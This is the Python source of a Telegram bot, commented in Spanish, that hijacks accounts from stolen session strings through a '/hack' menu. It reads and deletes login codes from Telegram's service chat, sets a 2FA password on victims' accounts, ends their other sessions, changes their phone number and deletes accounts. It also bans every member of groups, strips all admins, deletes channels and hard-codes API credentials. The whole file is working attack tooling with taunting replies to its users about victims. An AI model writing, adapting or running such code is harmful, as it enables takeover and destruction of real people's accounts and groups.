
import os
os.system("pip install Telethon==1.21.1")
from telethon import TelegramClient, events, functions, types
api_id = os.environ.get("APP_ID")
import os, asyncio
from os import system
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
api_hash = os.environ.get("API_HASH")
token = os.environ.get("BOT_TOKEN")
client = TelegramClient('I AM I', api_id, api_hash).start(bot_token=token)
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon;from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa

from telethon.tl.functions.channels import CreateChannelRequest as ccr
mybot = "missrose_bot"
bot = borg = client




async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X.get_me()
    return str(k)

async def terminate(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(rt())
GROUP_LIST = []
async def delacc(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(functions.account.DeleteAccountRequest("me hi chutia hu"))

async def promote(strses, grp, user):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    try:
      await X.edit_2fa('IAMI')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      


async def joingroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(join(username))

async def leavegroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    await X(dc(username))
    

async def cu(strses):
  try:
    async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
        k = await X.get_me()
        return [str(k.first_name), str(k.username or k.id)]
  except Exception as e:
    return False

async def usermsgs(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    i = ""
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await client.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(ses(strses), 1621727, "31350903c528876f79527398c09660ce") as X:
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nNombre del Canal {x.title} Username del canal @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "@AccsTGUpdate"
menu = '''



A: [Verifica los canales donde tiene propiedad]

B: [Toda la informacion del usuario (incluye numero)]

C: [banear en un grupo {todos los miembros}]

D: [saber el ultimo otp {primero solicita otp y luego usa este comando}]

E: [unete a un grupo o canal via StringSession]

F: [abandona un grupo o canal via StringSession]

G: [borra grupo o canal]

H: [Verifica si el usuario tiene verificacion de 2 pasos]

I: [Termina todas las sesiones excepto la session string]

J: [Borra una cuenta]

K: [Quitale el admin a todos en un canal o grupo]

L: [Promueve a alguien en un grupo o canal]

M: [Cambia el numero con StringSession]



TS Bot'''
mm = '''
Para usarme escribe /hack
'''
@client.on(events.NewMessage(pattern="/start"))
async def op(event):
  global mm
  if not event.is_private:
    await event.reply("Usame en privado🥺")
  else:
    await event.reply(mm)
@client.on(events.NewMessage(pattern="/hack", func=lambda x: x.is_group))
async def op(event):
  await event.reply("Usame en privado🥺")
@client.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  async with bot.conversation(event.chat_id) as x:
    await x.send_message(f"escoje una opcion \n\n{menu}")
    res = await x.get_response()
    r = res.text
    if res.text == "A":
      await x.send_message("dame la session")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("La session no esta activa")
      try:
        i = await userchannels(strses.text)
      except:
        return await event.reply("La session no esta activa")
      if len(i) > 3855:
        file = open("session.txt", "w")
        file.write(i + "\n\nTS Bot")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\nGracias por usarme")
    elif res.text == "B":
      await x.send_message("dame la session")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("La session no esta activa")
      i = await userinfo(strses.text)
      await event.reply(i + "\n\nGracias por usarme")
    elif r == "C":
      await x.send_message("dame la session")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("La session no esta activa")
      await x.send_message("Dame el ID o @ del canal")
      grpid = await x.get_response()
      await userbans(strses.text, grpid.text)
      await event.reply("Baneando Gracias por usarme")
    elif r == "D":
      await x.send_message("dame la session")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("La session no esta activa")
      i = await usermsgs(strses.text)
      await event.reply(i + "\n\nGracias por usarme")
    elif r == "E":
      await x.send_message("dame la session")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("La session no esta activa")
      await x.send_message("Dame el @ o id del grupo o canal")
      grpid = await x.get_response()
      await joingroup(strses.text, grpid.text)
      await event.reply("Unido al grupo/canal Gracias por usarme")
    elif r == "F":
      await x.send_message("dame la session")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("La session no esta activa")
      await x.send_message("Dame el @ o id del grupo o canal")
      grpid = await x.get_response()
      await leavegroup(strses.text, grpid.text)
      await event.reply("salio del grupo/canal Gracias por usarme")
    elif r == "G":
      await x.send_message("dame la session")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("La session no esta activa")
      await x.send_message("Dame el @ o id del grupo o canal")
      grpid = await x.get_response()
      await delgroup(strses.text, grpid.text)
      await event.reply("Canal o Grupo Borrado :p Gracias por usarme")
    elif r == "H":
      await x.send_message("dame la session")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("La session no esta activa")
      i = await user2fa(strses.text)
      if i:
        await event.reply("El pendejo no tiene activado el 2FA XDDDDDDDDD TS Bot")
      else:
        await event.reply("si tiene 2fa ptm")
    elif r == "I":
      await x.send_message("dame la session")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("La session no esta activa")
      i = await terminate(strses.text)
      await event.reply("sessiones terminadas\n\nGracias por usarme")
    elif res.text == "J":
      await x.send_message("dame la session")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("La session no esta activa")
      i = await delacc(strses.text)
      await event.reply("Cuenta eliminada\n\nGracias por usarme")
    elif res.text == "L":
      await x.send_message("dame la session")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("La session no esta activa")
      await x.send_message("Dame el @ del grupo del canal")
      grp = await x.get_response()
      await x.send_message("ahora el @ del usuario")
      user = await x.get_response()
      i = await promote(strses.text, grp.text, user.text)
      await event.reply("Promoviendo en el grupo/canal😗😗\n\nGracias por usarme")
    elif res.text == "K":
      await x.send_message("dame la session")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("La session no esta activa")
      await x.send_message("dame el @ del grupo/canal")
      pro = await x.get_response()
      try:
        i = await demall(strses.text, pro.text)
      except:
        pass
      await event.reply("Demoteando a todos 😗😗\n\nTs Bot")
    elif res.text == "M":
      await x.send_message("dame la session")
      strses = await x.get_response()
      op = await cu(strses.text)
      if op:
        pass
      else:
        return await event.respond("La session no esta activa")
      await x.send_message("DAME EL NÚMERO QUE DESEA CAMBIAR\n[NOTA: NO USE números de TextNow o alguna app de numeros virtuales]")
      number = (await x.get_response()).text
      try:
        result = await change_number(strses.text, number)
        await event.respond(result + "\n copia el hash code y verifica si tu numero obtuvo el otp\nEspera 20 segundos y copia el hash y OTP")
        await asyncio.sleep(20)
        await x.send_message("Ahora dame el Hash Code")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("Ahora el OTP")
        otp = (await x.get_response()).text
        changing = await change_number_code(strses.text, number, phone_code_hash, otp)
        if changing:
          await event.respond("Has cambiado el numero con EXITO \n\nTS Bot")
        else:
          await event.respond("Algo esta mal...")
      except Exception as e:
        await event.respond("Envia esto a @faay2020\n" + str(e))

    else:
      await event.respond("Texto no reconocido envia /hack e intenta de nuevo")





client.run_until_disconnected()
